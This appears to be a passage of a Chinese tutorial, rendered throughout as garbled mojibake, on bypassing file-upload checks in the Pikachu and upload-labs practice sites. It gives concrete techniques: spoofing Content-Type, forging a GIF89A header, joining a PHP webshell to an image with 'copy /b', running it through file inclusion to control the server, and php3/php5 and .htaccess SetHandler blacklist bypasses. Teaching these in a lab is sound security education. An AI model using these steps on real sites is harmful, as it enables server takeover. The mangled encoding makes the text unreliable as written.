çš„æ–‡ä»¶è¿›è¡Œä¸€å®šçš„æ£€æŸ¥ã€‚ ## åˆ†æupload_sickå‡½æ•°ï¼ˆå®šä¹‰åœ¨uploadfunction.phpæ–‡ä»¶é‡Œé¢ï¼‰å­˜åœ¨æ¼æ´çš„çš„åŸå› æ˜¯å› ä¸º $ _FILES() è¿™ä¸ªå…¨å±€çš„æ–¹æ³•æ˜¯é€šè¿‡æµè§ˆå™¨httpå¤´å»è·å–çš„content-typeï¼Œcontent-typeæ˜¯å‰ç«¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ã€‚å®¹æ˜“è¢«ç»•è¿‡ã€‚ ## ä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„ç¬¦åˆæ ‡å‡†çš„å›¾ç‰‡ï¼Œå¯¹å…¶content-typeè¿›è¡ŒæŠ“åŒ…æ“ä½œã€‚å¯è§æ­£å¸¸ä¸Šä¼ ç¬¦åˆè¦æ±‚çš„å›¾ç‰‡ä¸­æ•°æ®åŒ…ä¸­content-typeä¸ºimagepngå¯¹æ¯”ç¬¦åˆæ¡ä»¶ï¼Œè€Œphpæ–‡ä»¶åˆ™ä¸ç¬¦åˆæ¡ä»¶è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯ã€‚ 2-2 ä»£ç æ³¨å…¥ç»•è¿‡â€“getimagesize()getimagesize() æ˜¯phpçš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å›FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ï¼Œå¦‚æœç”¨è¿™ä¸ªæ¶µæ•°æ¥è·å–ç±»å‹ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡çš„è¯ï¼Œä¼šå­˜åœ¨é—®é¢˜ã€‚å…¶å®è¿™ä¸ªå‡½æ•°æ¯”è¾ƒéš¾ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒå®‰å…¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œç»•è¿‡å®ƒä¸‰ç§æ–¹æ³•ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥è¿˜éœ€è¦ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œå°±æ˜¯å¯¹æ–¹ç«™ç‚¹è¿˜è¦æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ‰èƒ½ç»•è¿‡å®ƒï¼Œæˆ–è€…ä¿®æ”¹æ–‡ä»¶æ•°æ®çš„å¤´éƒ¨æ•°æ®ã€‚ å‡½æ•°ç”¨æ³•: è¯­æ³•æ ¼å¼ï¼š array getimagesize ( string $filename [, array $imageinfo ] ) getimagesize() ## å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚ å‘ç°æŠ¥é”™äº†ï¼Œå¦‚æœçœ‹åˆ°è¿™ä¸ªé”™è¯¯ï¼Œå°±æ˜¯æˆ‘ä»¬phpç‰ˆæœ¬çš„é—®é¢˜ ## ä»php5.3 ï¼Œå½“å¯¹ä½¿ç”¨date()ç­‰å‡½æ•°æ—¶ï¼Œå¦‚æœtimezoneè®¾ç½®ä¸æ­£ç¡®ï¼Œåœ¨æ¯ä¸€æ¬¡è°ƒç”¨æ—¶é—´å‡½æ•°æ—¶,éƒ½ä¼šäº§ç”ŸE_NOTICE æˆ–è€… E_WARNING ä¿¡æ¯ã€‚çŸ¥é“äº†é—®é¢˜çš„æ ¹æºï¼Œè§£å†³çš„æ–¹æ³•æœ‰ä¸‰ç§ï¼Œä»»é€‰ä¸€ç§å³å¯ã€‚ ## ä¸€ã€åœ¨é¡µå¤´ä½¿ç”¨date_default_timezone_set()è®¾ç½® date_default_timezone_set(â€˜PRCâ€™); ## äºŒã€åœ¨é¡µå¤´ä½¿ç”¨ini_set(â€˜date.timezoneâ€™,â€™AsiaShanghaiâ€™); ## ä¸‰ã€ä¿®æ”¹php.iniã€‚æ‰“å¼€php5.iniæŸ¥æ‰¾date.timezone å»æ‰å‰é¢çš„åˆ†å·ä¿®æ”¹æˆä¸ºï¼šdate.timezone PRC ## æ³¨æ„ï¼šä¸Šè¿°è®¾ç½®éƒ½æ˜¯é’ˆå¯¹ä¸­å›½å¤§é™†æ¥è®¾ç½®çš„ï¼ŒåŒæ—¶PRCä¹Ÿå¯ä»¥ç”¨AsiaShanghaiï¼ŒAsiaChongqingï¼ŒAsiaUrumqiæ¥ä»£æ›¿ phpstudyè§£å†³èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œåˆ‡æ¢ç‰ˆæœ¬å³å¯ ç„¶åå†å›æ¥ï¼Œç‚¹å‡»å¼€å§‹ä¸Šä¼ ï¼Œå°±æç¤ºä½ æ ¼å¼ä¸å¯¹äº† æŒ‰ç…§ä¹‹å‰çš„æ–¹å¼è‚¯å®šæ˜¯ä¸èƒ½ç»•è¿‡äº†ï¼Œé‚£å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ æ–‡ä»¶åŒ…å«æ¼æ´ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ï¼Œè¿™å¥è¯çš„æ„æ€æ˜¯ï¼Œæˆ‘ä»¬å°†æœ¨é©¬åšæˆå›¾ç‰‡æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯å›¾ç‰‡æºå¸¦æœ¨é©¬ï¼Œè¿™ç§æƒ…å†µï¼Œåˆ©ç”¨ä¸Šä¼ æ¼æ´æ¥æ”»å‡»ã€‚çœ‹æ–¹æ³• æ–¹æ³•ä¸€ï¼šç›´æ¥ä¼ªé€ å¤´éƒ¨GIF89A æ–¹æ³•äºŒï¼šCMDæ–¹æ³•ï¼Œcopy b test.png+1.php muma.png æ–¹æ³•ä¸‰ï¼šç›´æ¥ä½¿ç”¨å·¥å…·å¢åŠ å¤‡æ³¨å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ æ–¹æ³•ä¸€ï¼šç›´æ¥ä¼ªé€ å¤´éƒ¨GIF89A GIF89Aæ˜¯gifå›¾ç‰‡æ ¼å¼çš„æ•°æ®å¼€å¤´ã€‚ æ¯ç§ç±»å‹çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æ•°æ®çš„å¼€å¤´éƒ½æ˜¯ä¸åŒçš„ï¼Œç›¸åŒçš„æ–‡ä»¶ç±»å‹ï¼Œæ‰“å¼€ä¹‹åï¼Œæ–‡ä»¶æ•°æ®è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œ æ¯”å¦‚æˆ‘ä»¬é€šè¿‡è®°äº‹æœ¬ä»¥16è¿›åˆ¶çš„å½¢å¼æ‰“å¼€å‡ ä¸ªå›¾ç‰‡çœ‹çœ‹æ•ˆæœï¼š è€Œgetimagesize() å‡½æ•°é™¤äº†æ£€æŸ¥äº†æ–‡ä»¶æ‰©å±•åï¼Œè¿˜ä¼šæ£€æŸ¥æ–‡ä»¶æ•°æ®ï¼Œå½“æˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªéå›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åé€šè¿‡burpæ”¹äº†æ•°æ®åŒ…ï¼Œæ”¹ä¸ºäº†å›¾ç‰‡æ ¼å¼çš„åç¼€åï¼Œå‘é€åŒ…ä¹‹åï¼ŒæŠ¥é”™äº†ï¼Œæ‰€ä»¥å¦‚æœphpå¼€å‘äººå‘˜ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ”»å‡»æ—¶ï¼Œè¦è€ƒè™‘è¿™ä¸ªäº‹æƒ…ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°ä¸æ˜¯å°†æ–‡ä»¶å†…å®¹å…¨éƒ¨æ£€æŸ¥ä¸€éï¼Œå®ƒæ£€æŸ¥çš„å°±æ˜¯æ–‡ä»¶æ•°æ®ä¸­çš„å‰é¢æ ‡è¯†æ–‡ä»¶æ ¼å¼çš„æ•°æ®ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°†gitå›¾ç‰‡æ ¼å¼æ•°æ®çš„å¤´æ•°æ®æ”¾åˆ°æˆ‘ä»¬æ•°æ®åŒ…çš„å‰é¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿç»•è¿‡ æœç„¶ï¼ŒæˆåŠŸäº†ã€‚ æ–¹æ³•äºŒï¼šcopyæ–¹æ³• CMDæ–¹æ³•ï¼š copy b test.png+1.php muma.png å¥½ï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªmumaæ–‡ä»¶ï¼Œå¦‚ä¸‹ é‡Œé¢æ”¾çš„èœåˆ€çš„phpä¸€å¥è¯æœ¨é©¬ ç„¶åæˆ‘ä»¬å†copyä¸€ä¸ªå›¾ç‰‡åˆ°è¿™ä¸ªç›®å½•ä¸‹ ç°åœ¨æ˜¯ä¸€ä¸ªç ï¼Œä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œé€šè¿‡å¦‚ä¸‹æŒ‡ä»¤ï¼Œå°†ä¸¤è€…ç»“åˆï¼Œé€šè¿‡copyå‘½ä»¤å³å¯ copy b kb.png+muma.txt muma.png æ•ˆæœï¼š é€šè¿‡æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚nodepad++æ‰“å¼€çœ‹æ•ˆæœï¼š çœ‹åˆ°äº†æˆ‘ä»¬çš„æœ¨é©¬ç¨‹åºï¼Œç„¶åå°†è¿™ä¸ªå›¾ç‰‡ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šå»å³å¯ï¼Œè¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ã€‚ æ–¹æ³•ä¸‰ï¼šç›´æ¥ä½¿ç”¨å·¥å…·å¢åŠ å¤‡æ³¨å†™å…¥ä¸€å¥è¯æœ¨é©¬ è¿™æ˜¯é€šè¿‡å·¥å…·ç»™å›¾ç‰‡ç­‰æ–‡ä»¶æ•°æ®åŠ å…¥æœ¨é©¬ç¨‹åºæ•°æ®ï¼Œä½†æ˜¯å’Œæ–¹æ³•äºŒä¸åŒçš„å°±æ˜¯ï¼Œæ–¹æ³•äºŒæ˜¯å°†æœ¨é©¬ç¨‹åºæ”¾åˆ°äº†æ–‡ä»¶æ•°æ®çš„ç»“å°¾ï¼Œè¿™ä¸ªå·¥å…·æ˜¯å°†æœ¨é©¬ç¨‹åºæ”¾åˆ°æ–‡ä»¶æ•°æ®çš„éšæœºä½ç½®ï¼Œå®ƒå¯ä»¥ç»•è¿‡äºŒæ¬¡æ¸²æŸ“ã€‚è¿™ä¸ªäºŒæ¬¡æ¸²æŸ“æˆ‘ä»¬åé¢ä¼šè®²ã€‚ å¼¹å‡ºå¦‚ä¸‹çª—å£ï¼Œä¸€å¥è¯æœ¨é©¬æ”¾è¿›å»ï¼Œç‚¹å‡»ok è¿™ä¸ªå›¾ç‰‡å°±åŠ ä¸Šäº†ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™ä¸ªæœ¨é©¬ç¨‹åºé€šè¿‡èœåˆ€å°±èƒ½è¿æ¥ è¿™ç§æ–¹å¼æ¯”å‰é¢ä¸¤ä¸ªæ–¹å¼éƒ½å¥½ä¸€äº›ï¼Œç®—æ˜¯æœ€å¥½æ‰‹æ®µäº†ã€‚ é‚£ä¹ˆå°†å«æœ‰æœ¨é©¬ç¨‹åºçš„å›¾ç‰‡ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œæ¯”å¦‚æˆ‘å°†è¿™ä¸ªtest.jpgæ–‡ä»¶ èƒ½å¤Ÿå½“ä½œæœ¨é©¬æ‰§è¡Œå—ï¼Ÿé»˜è®¤æƒ…å†µä¸‹è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œè¿™æ ·æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹æˆ‘ä»¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ç½‘å€ï¼Œçœ‹æ•ˆæœ http://192.168.0.15/pikachu/vul/unsafeupload/uploads/2021/09/17/855149614490b3007b9961050981.jpg é’ˆå¯¹è¿™ä¸ªè·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥çš„æ–¹å¼æ¥æ‰¾åˆ°æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œä»è€Œè§¦å‘æˆ‘ä»¬çš„å›¾ç‰‡ä¸­çš„æœ¨é©¬ç¨‹åº http://192.168.0.15/pikachu/vul/fileinclude/fi_local.php?filename=file1.phpsubmit=%E6%8F%90%E4%BA%A4 ## file1.phpæ‰€åœ¨ç›®å½•ï¼š C:\\phpStudy\\PHPTutorial\\WWW\\pikachu\\vul\\fileinclude\\include é€šè¿‡å®ƒæ¥æ‰¾åˆ°æˆ‘ä»¬çš„å›¾ç‰‡æ–‡ä»¶ å®ƒéœ€è¦ç»“åˆå¦å¤–ä¸€ä¸ªæ¼æ´æ‰èƒ½å°†ä»»æ„æ–‡ä»¶å½“ä½œè„šæœ¬æ¥æ‰§è¡Œï¼Œæ¯”å¦‚å›¾ç‰‡å¸¦æœ¨é©¬çš„æ–‡ä»¶ï¼Œå¦‚æœè¦æ‰§è¡Œï¼Œéœ€è¦é…ç½®æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´æˆ‘ä»¬åé¢è®²ã€‚è¿™ä¸ªgetimagesize()å‡½æ•°è™½ç„¶èƒ½å¤Ÿå¯¹æ–‡ä»¶æ ¼å¼åšå’Œå¥½çš„é™åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿå°±æ˜¯æ–‡ä»¶ä¸­åŒ…å«æœ¨é©¬çš„æ–¹å¼ä¹Ÿèƒ½è¿›è¡Œæ”»å‡»æ¸—é€ã€‚èœåˆ€è¿æ¥ åŒå‡»è¿æ¥ï¼Œæ§åˆ¶æœåŠ¡å™¨ æ–¹æ³•å››ï¼šæ£€æŸ¥åç¼€ å°±æ˜¯å¯¹æ–‡ä»¶åç¼€åè¿›è¡Œåˆ¤æ–­ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡‡å–ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼Œé»‘åå•å’Œç™½åå•ã€‚ é»‘åå•æŒ‡çš„æ˜¯ç¨‹åºå‘˜åœ¨å†™ä»£ç çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šå°†ä¸€äº›phpã€jspç­‰è„šæœ¬æˆ–è€…ä»£ç åŠ å…¥é»‘åå•ï¼Œè¿™ç§å¤„ç†æ–¹å¼ä¸å¤ªå¥½ï¼Œå› ä¸ºå¾ˆå®¹æ˜“ç»•è¿‡ã€‚ å¤§å®¶å…ˆæ­å»ºä¸€ä¸ªç½‘ç«™ï¼Œè¿™ä¸ªç½‘ç«™æ–‡ä»¶å¤¹æˆ‘ç»™å¤§å®¶æ”¾åˆ°å·¥å…·é‡Œé¢äº†ï¼Œå°±æ˜¯ä¸€ä¸ªå«åšuploadçš„æ–‡ä»¶å¤¹ï¼Œå°†å®ƒæ”¾å…¥åˆ°phpstudyçš„wwwç›®å½•ä¸­å»å³å¯ä½¿ç”¨ ç„¶ååœ¨uploadæ–‡ä»¶å¤¹é‡Œé¢åœ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¹Ÿå«åšupload ç„¶åè®¿é—®ç½‘å€ï¼š http://192.168.0.15/upload/ è¿™ä¸ªç½‘ç«™åŸºæœ¬ä¸ŠåŒ…å«äº†æ‰€æœ‰çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¤ºä¾‹ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªå­¦ä¹ ä¸€ä¸‹ã€‚å¦‚æœä½ å°†è¿™ä¸ª20ä¸ªé¢˜éƒ½åšå‡ºæ¥äº†ï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯¹äºç°å®çš„ç½‘ç«™çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´éƒ½èƒ½æï¼Œå¦‚æœç»“åˆè¿™äº›æ‰‹æ®µè¿˜æ˜¯æ²¡æœ‰å®Œæˆæ–‡ä»¶ä¸Šä¼ æ¼æ´æ”»å‡»ï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå°±å¯ä»¥å®£å‘Šä¸èƒ½æ”»å‡»äº†ã€‚ 9-3-3 20å…³3-1 ç¬¬ä¸€å…³ï¼šå‰ç«¯æ ¡éªŒç»•è¿‡3-2 ç¬¬äºŒå…³ï¼šmimeç±»å‹æˆ‘ä»¬ä»ç¬¬ä¸‰å…³å¼€å§‹ã€‚ 3-3 ç¬¬ä¸‰å…³ï¼šé»‘åå•ç»•è¿‡ä¹‹php3ã€php5 å¤§å®¶å¯ä»¥çœ‹çœ‹æºä»£ç  $is_upload false; $msg null; if (isset($_POST[â€˜submitâ€™])) { if (file_exists(UPLOAD_PATH)) { $deny_ext array(â€˜.aspâ€™,â€™.aspxâ€™,â€™.phpâ€™,â€™.jspâ€™); é»‘åå• $file_name trim($_FILES[â€˜upload_fileâ€™][â€˜nameâ€™]); $file_name deldot($file_name);åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext strrchr($file_name, â€˜.â€™); $file_ext strtolower($file_ext); è½¬æ¢ä¸ºå°å†™ $file_ext str_ireplace(â€˜::$DATAâ€™, â€˜â€™, $file_ext);å»é™¤å­—ç¬¦ä¸²::$DATAï¼Œè¿™ ä¸ªæ€ä¹ˆç»•è¿‡ï¼Œåé¢ä¼šå°† $file_ext trim($file_ext); é¦–å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) { $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $img_path UPLOAD_PATH.â€™â€˜.date(â€œYmdHisâ€).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload true; } else { $msg â€˜ä¸Šä¼ å‡ºé”™ï¼â€™; } } else { $msg â€˜ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼â€™; } } else { $msg UPLOAD_PATH . â€˜æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼â€™; } } è¿™é‡Œæ˜¯é»‘åå•éªŒè¯(â€˜.aspâ€˜,â€˜.aspxâ€˜,â€˜.phpâ€˜,â€˜.jspâ€˜)ï¼Œæˆ‘ä»¬å¯ä¸Šä¼ php3,php5â€¦ç­‰è¿™æ ·å¯ä»¥è¢«æœåŠ¡å™¨è§£æçš„åç¼€åï¼Œå½“ç„¶ï¼Œè¿™ä¸ªæ˜¯æ ¹æ®æœåŠ¡å™¨çš„é…ç½®æ¥ï¼Œå¦‚æœé…ç½®ä¸­å¯ä»¥è¢«è§£æï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ è¿™æ ·çš„æ–‡ä»¶ï¼Œä¸è¿‡ç°åœ¨apacheç­‰é»˜è®¤æ˜¯ä¸æ”¯æŒè¿™ç§æ–‡ä»¶è§£æäº†ã€‚æ¯”å¦‚ä¸‹é¢è¿™ç§ ç°åœ¨é»˜è®¤æ˜¯è§£æä¸äº†çš„ï¼Œé™¤éæ”¹apacheçš„é…ç½®æ–‡ä»¶ é€šè¿‡è·¯å¾„æ‰“å¼€ æ•ˆæœï¼šéƒ½æ˜¯ä»£ç ï¼Œæ²¡æœ‰è¢«è§£ææ‰§è¡Œ è®©apacheè§£æï¼Œä¿®æ”¹httpdé…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹ä½ç½® AddType applicationx-httpd-php .php .phtml php3 php5 3-4 ç¬¬å››å…³ï¼šé»‘åå•ç»•è¿‡ .htaccesså’Œæ–‡ä»¶åå åŠ ç‰¹æ€§ç»•è¿‡ åˆ†æä»£ç å‘ç°ï¼Œè¿™é‡Œå¯¹ä¸Šä¼ çš„åç¼€åçš„åˆ¤æ–­å¢åŠ äº†ï¼Œphp3.php5â€¦.å·²ç»ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æ²¡æœ‰é™åˆ¶.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚ è¡¥å……ä¸€ä¸ª.htaccessæ–‡ä»¶æ¼æ´è¿™æ˜¯ä¹Ÿæ˜¯é»‘åå•ä¸­çš„ä¸€ç§æ–¹æ³•ï¼Œé»‘åå•ä¸­æ²¡æœ‰å°†è¿™ä¸ªåç¼€åçš„æ–‡ä»¶åŠ å…¥é»‘åå•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§æ–‡ä»¶æ¥è¿›è¡Œæ”»å‡»ï¼Œè¿™ç§æ–‡ä»¶æ˜¯apacheçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œé‡Œé¢æˆ‘ä»¬å†™äº†ä¸‰è¡Œä»£ç ã€‚å¯ä»¥è¯´æ˜¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥æ”¹apacheçš„é…ç½®ï¼Œå¯¼è‡´apacheå‡ºç°è§£ææ¼æ´ã€‚ SetHandler applicationx-httpd-php å¦‚ä¸‹äº†è§£å†…å®¹ï¼Œæœ‰å…´è¶£çš„å¯ä»¥çœ‹ä¸€çœ‹ï¼š ## .htaccessæ˜¯ä»€ä¹ˆï¼Œä¸‹é¢çš„å†…å®¹ä¸ç”¨çœ‹ã€‚ ## .htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ ## æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ ## å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚ ## ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚ ## .htaccessæ–‡ä»¶å¯ä»¥åœ¨ç½‘ç«™ç›®å½•æ ‘çš„ä»»ä½•ä¸€ä¸ªç›®å½•ä¸­ï¼Œåªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•æœ‰æ•ˆã€‚ æ³¨æ„ï¼š ## å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šç¬¼ç›–æ›´é«˜çº§ç›®å½•æˆ–è€…ä¸»å™¨é…ç½®ä¸­çš„æŒ‡ä»¤ã€‚ ## å¦‚æœ .htaccess æ–‡ä»¶ä¿å­˜åœ¨ apachehomewwwGunjit ç›®å½•ï¼Œé‚£ä¹ˆå®ƒä¼šå‘è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•æä¾›å‘½ä»¤ï¼Œä½†å¦‚æœè¯¥ç›®å½•åŒ…å«ä¸€ä¸ªåä¸º Gunjitimages å­ç›®å½•ï¼Œä¸”è¯¥å­ç›®å½•ä¸­ä¹Ÿæœ‰ä¸€ä¸ª.htaccess æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªå­ç›®å½•ä¸­çš„å‘½ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•ä¸­ .htaccess æ–‡ä»¶(æˆ–è€…ç›®å½•å±‚æ¬¡ç»“æ„ä¸­æ›´ä¸Šå±‚çš„æ–‡ä»¶)æä¾›çš„å‘½ä»¤ã€‚ ## .htaccessæ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº.htaccessæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ï¼Œä½†æ˜¯å¾ˆé‡è¦çš„ã€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…¶ä¸Šçº§ç›®å½•ä¹Ÿå¯èƒ½ä¼šæœ‰.htaccessæ–‡ä»¶ï¼Œè€ŒæŒ‡ä»¤æ˜¯æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¯èƒ½ä¼šè¦†ç›–å…¶ä¸Šçº§ç›®å½•ä¸­çš„.htaccessæ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå³å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚ ## .htaccesså¿…éœ€ä»¥ASCIIæ¨¡å¼ä¸Šä¼ ï¼Œæœ€å¥½å°†å…¶æƒé™è®¾ç½®ä¸º644ã€‚ä½¿ç”¨.htaccessæ–‡ä»¶ï¼Œä¼šé™ä½httpdæœåŠ¡å™¨çš„ä¸€ç‚¹æ€§èƒ½ä¸ºä»€ä¹ˆè¦ä½¿ç”¨.htaccess ## 